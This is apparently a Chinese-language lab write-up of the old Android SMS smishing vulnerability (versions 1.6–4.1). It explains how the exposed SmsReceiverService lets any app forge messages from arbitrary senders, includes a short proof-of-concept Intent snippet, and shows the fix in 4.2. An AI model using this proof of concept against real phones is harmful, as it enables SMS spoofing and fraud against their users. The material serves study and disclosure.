---
title: 移动安全-短信欺诈漏洞验证 
date: 2020-06-04 00:20:15 
tags:
  - "网络空间安全"
  - "移动终端安全"
  - "Android"
  - "安卓系统"
categories:
  - ["实验","移动终端安全"]
  - ["漏洞","Android"]

---

## 漏洞介绍

原生安卓4.0系统中，有一个名称为SMS smishing vuln的漏洞，其具体表现为任意应用可以在没有`write_sms`权限下伪造任意发件人的任意短信，影响范围从Android 1.6系统一直到4.1系统。Android
4.2系统修复了这个安全漏洞。

<!-- more -->

## 原理分析

与短信服务相关的`/system/app/Mms.apk`的`AndroidManifest.xml`文件[^1]中，`smsReceiverService`
没有以正确的权限声明，被暴露在外，而且服务暴露之后，没有使用`permission`或签名声明，没有判断调用者，甚至也没有一般声明，这是相当危险的。 {% codeblock
/packages/apps/Mms/AndroidManifest.xml lang:
xml http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/AndroidManifest.xml AndroidManifest.xml first_line:44 mark:
51,54 %}
<application android:name="MmsApp"
android:label="@string/app_label"
android:icon="@mipmap/ic_launcher_smsmms"
android:taskAffinity="android.task.mms"
android:allowTaskReparenting="true">

        <service android:name=".transaction.TransactionService"
                 android:exported="true" />

        <service android:name=".transaction.SmsReceiverService"
                 android:exported="true" />

{% endcodeblock %}

### 构造PDU

* 安卓设备接收到的SMS是PDU形式的(protocol description unit)，其相关信息由`android.telephony.gsm.SmsMessage`类存储，我们可以从接收到的PDU中创建`SmsMessage`
  实例，令Toast组件以系统通知形式来显示信息文本。
* 在`SmsMessage.java`中，处理用户数据的方式依靠`getSubmitPdu`方法。其中将尝试7bit和UCS-2两种编码方式。无论是哪种编码方式，PDU的结构大致如下所示：

{% codeblock line_number:false %} A|B|C|D|E|F|G|H|I|J|K|L|M {% endcodeblock %}

{% tabs PDU, 1 %}
<!-- tab A -->
短信息中心地址长度，2位十六进制数(1字节)。
<!-- endtab -->
<!-- tab B-->
短信息中心号码类型，2位十六进制数。
<!-- endtab -->
<!-- tab C-->
短信息中心号码，B+C的长度将由A中的数据决定。
<!-- endtab -->
<!-- tab D-->
文件头字节，2位十六进制数。
<!-- endtab -->
<!-- tab E-->
信息类型，2位十六进制数。
<!-- endtab -->
<!-- tab F-->
被叫号码长度，2位十六进制数。
<!-- endtab -->
<!-- tab G-->
被叫号码类型，2位十六进制数，取值同B。
<!-- endtab -->
<!-- tab H-->
被叫号码，长度由F中的数据决定。
<!-- endtab -->
<!-- tab I-->
协议标识，2位十六进制数。
<!-- endtab -->
<!-- tab J-->
数据编码方案，2位十六进制数。
<!-- endtab -->
<!-- tab K-->
有效期，2位十六进制数。
<!-- endtab -->
<!-- tab L-->
用户数据长度，2位十六进制数。
<!-- endtab -->
<!-- tab M-->
用户数据，其长度由L中的数据决定。J中设定采用UCS2编码，这里是中英文的Unicode字符。
<!-- endtab -->
{% endtabs %}

* 既然解析和构造SMS的方法是已知的，那么我们就会有办法不经其他手机号码，任意构造消息，而被其他手机接收。 {% codeblock SmsMessage.java lang:java %} byte[] userData; try{
  if(encoding == ENCODING_7BIT){ userData = GsmAlphabet.stringToGsm7BitPackedWithHeader(message, header, languageTable,
  languageShiftTable); } else{ //assume UCS-2 try{ userData = encodeUCS2(message, header); }catch(
  UnsupportedEncodingException uex){ Log.e(LOG_TAG, "Implausible UnsupportedEncodingException ", uex); return null; } }
  }catch(EncodeException ex){ // Encoding to the 7-bit alphabet failed. Let's see if we can send it as a UCS-2 encoded
  message try{ userData = encodeUCS2(message, header); encoding = ENCODING_16BIT; }catch(UnsupportedEncodingException
  uex){ Log.e(LOG_TAG, "Implausible UnsupportedEncodingException ", uex); return null; } } {% endcodeblock %}

### 启动<code>SmsReceiverService</code>

{% codeblock MainActivity.java lang:java %} // pass to SmsReceiverService which has the permission to send short message
Intent intent = new Intent(); intent.setClassName("com.android.mms",
"com.android.mms.transaction.SmsReceiverService"); intent.setAction("android.provider.Telephony.SMS_RECEIVED");
intent.putExtra("pdus", new Object[] { pdu }); intent.putExtra("format", "3gpp"); context.startService(intent); {%
endcodeblock %}

* POC在上图代码中启用了短信接收服务（`SmsReceiverService`），当服务启动时，经过了`onStartCommand` → `mServiceHandler.sendMessage(msg)`
  ，消息进入`ServiceHandler`的消息队列中，在`handleMessage`中得到处理，由于`action`是`SMS_RECEIVED`，所以进入`handleSmsReceived`函数。

{% codeblock SmsReceiverService.java lang:
java http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#124
ServiceHandler first_line:124 mark:138 %} @Override public int onStartCommand(Intent intent, int flags, int startId) {
// Temporarily removed for this duplicate message track down.

        mResultCode = intent != null ? intent.getIntExtra("result", 0) : 0;

        if (mResultCode != 0) {
            Log.v(TAG, "onStart: #" + startId + " mResultCode: " + mResultCode +
                    " = " + translateResultCode(mResultCode));
        }

        Message msg = mServiceHandler.obtainMessage();
        msg.arg1 = startId;
        msg.obj = intent;
        mServiceHandler.sendMessage(msg);
        return Service.START_NOT_STICKY;
    }

{% endcodeblock %}

{% codeblock SmsReceiverService.java#ServiceHandler lang:
java http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#177
ServiceHandler first_line:177 mark:205 %} private final class ServiceHandler extends Handler { public ServiceHandler(
Looper looper) { super(looper); }

    /**
     * Handle incoming transaction requests.
     * The incoming requests are initiated by the MMSC Server or by the MMS Client itself.
     */
    @Override
    public void handleMessage(Message msg) {
        int serviceId = msg.arg1;
        Intent intent = (Intent)msg.obj;
        if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {
            Log.v(TAG, "handleMessage serviceId: " + serviceId + " intent: " + intent);
        }
        if (intent != null) {
            String action = intent.getAction();

            int error = intent.getIntExtra("errorCode", 0);

            if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {
                Log.v(TAG, "handleMessage action: " + action + " error: " + error);
            }

            if (MESSAGE_SENT_ACTION.equals(intent.getAction())) {
                handleSmsSent(intent, error);
            } else if (SMS_RECEIVED_ACTION.equals(action)) {
                handleSmsReceived(intent, error);
            } else if (ACTION_BOOT_COMPLETED.equals(action)) {
                handleBootCompleted();
            } else if (TelephonyIntents.ACTION_SERVICE_STATE_CHANGED.equals(action)) {
                handleServiceStateChanged(intent);
            } else if (ACTION_SEND_MESSAGE.endsWith(action)) {
                handleSendMessage();
            }
        }
        // NOTE: We MUST not call stopSelf() directly, since we need to
        // make sure the wake lock acquired by AlertReceiver is released.
        SmsReceiver.finishStartingService(SmsReceiverService.this, serviceId);
    }

} /* ... */ } {% endcodeblock %}

{% tabs messages, 1 %}
<!-- tab handleSmsReceived@code -->
{% codeblock SmsReceiverService.java lang:
java http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#352
ServiceHandler first_line:352 mark:367 %} private void handleSmsReceived(Intent intent, int error) { SmsMessage[] msgs =
Intents.getMessagesFromIntent(intent); String format = intent.getStringExtra("format"); Uri messageUri = insertMessage(
this, msgs, error, format);

    if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE) || LogTag.DEBUG_SEND) {
        SmsMessage sms = msgs[0];
        Log.v(TAG, "handleSmsReceived" + (sms.isReplace() ? "(replace)" : "") +
                    " messageUri: " + messageUri +
                    ", address: " + sms.getOriginatingAddress() +
                    ", body: " + sms.getMessageBody());
    }

    if (messageUri != null) {
        // Called off of the UI thread so ok to block.
        MessagingNotification.blockingUpdateNewMessageIndicator(this, true, false);
    }

} {% endcodeblock %}
<!-- endtab -->
<!-- tab insertMessage@code-->
{% codeblock SmsReceiverService.java lang:
java http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java#419
ServiceHandler first_line:419 mark:434,436 %} /**
* If the message is a class-zero message, display it immediately * and return null. Otherwise, store it using the
* <code>ContentResolver</code> and return the * <code>Uri</code> of the thread containing this message * so that we can
use it for notification.
*/ private Uri insertMessage(Context context, SmsMessage[] msgs, int error, String format) { // Build the helper classes
to parse the messages. SmsMessage sms = msgs[0];

        if (sms.getMessageClass() == SmsMessage.MessageClass.CLASS_0) {
            displayClassZeroMessage(context, sms, format);
            return null;
        } else if (sms.isReplace()) {
            return replaceMessage(context, msgs, error);
        } else {
            return storeMessage(context, msgs, error);
        }
    }

{% endcodeblock %}
<!-- endtab -->
{% endtabs %}

* 在`handleSmsReceived`中，`MessagingNotification.blockingUpdateNewMessageIndicator()`调用即为我们平时看见的新信息提示条。
* `insertMessage`中，下面的两个分支最终都会进入`storeMessage`函数中，短信息会被存储在系统数据库中。

## 验证截图

我利用了安卓4.0的虚拟机来复现这个漏洞，设备信息截图如下 {% asset_img device.png %}

测试的效果见下面的五张图

{% note info %} AVD没有装中文输入法测不了中文，但是应该是没有问题的 {% endnote %}

{% grouppicture 5-4 %} {% asset_img try1.jpg %} {% asset_img try2.jpg %} {% asset_img try3.jpg %} {% asset_img try4.jpg
%} {% asset_img try5.jpg %} {% endgrouppicture %}

## 官方的修复措施

4.2.1版本的短信应用（`Mms.apk`）的`AndroidManifest.xml`中[^2]，`SmsReceiver`不再被暴露。 {% codeblock
/packages/apps/Mms/AndroidManifest.xml lang:
xml http://androidxref.com/4.2_r1/xref/packages/apps/Mms/AndroidManifest.xml#45 AndroidManifest.xml first_line:45 mark:
52,55 %}
<application android:name="MmsApp"
android:label="@string/app_label"
android:icon="@mipmap/ic_launcher_smsmms"
android:taskAffinity="android.task.mms"
android:allowTaskReparenting="true">

        <service android:name=".transaction.TransactionService"
                 android:exported="false" />

        <service android:name=".transaction.SmsReceiverService"
                 android:exported="false" />

{% endcodeblock %}

## 结论

对于系统级的服务来说，存在欺骗漏洞是灾难性的，因为任何其他应用服务可能都会调用这个存在漏洞的系统服务，从而产生了漏洞的传播。由于权限设置不当而产生的错误非常值得引起开发者的注意。

## 参考资料

1. https://www.csc2.ncsu.edu/faculty/xjiang4/smishing.html （Smishing Vulnerability in Multiple Android Platforms (
   including Gingerbread, Ice Cream Sandwich, and Jelly Bean)）
2. https://www.freebuf.com/articles/terminal/6169.html（对Android最新fakesms漏洞的分析）
3. http://androidxref.com/   4.0.3_r1分支（/4.0.3_r1/xref）和4.2_r1（/4.2_r1/xref）分支代码
4. https://github.com/thomascannon/android-sms-spoof  含有POC代码的安卓应用

[^1]: http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/AndroidManifest.xml

[^2]: http://androidxref.com/4.2_r1/xref/packages/apps/Mms/AndroidManifest.xml
